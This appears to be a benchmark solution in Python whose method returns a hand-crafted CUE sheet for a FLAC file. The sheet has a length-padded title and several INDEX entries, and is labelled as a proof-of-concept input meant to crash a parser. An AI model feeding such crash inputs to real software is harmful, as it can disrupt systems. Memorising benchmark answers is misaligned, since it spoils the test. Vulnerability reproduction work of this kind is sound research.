class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""FILE "crash.flac" FLAC
TRACK 01 AUDIO
  TITLE "Track One Title To Adjust Length Precisely For PoC Generation"
  PERFORMER "Performer Name"
  INDEX 01 00:00:00
  INDEX 02 00:01:23
  INDEX 03 00:02:46
"""
        return poc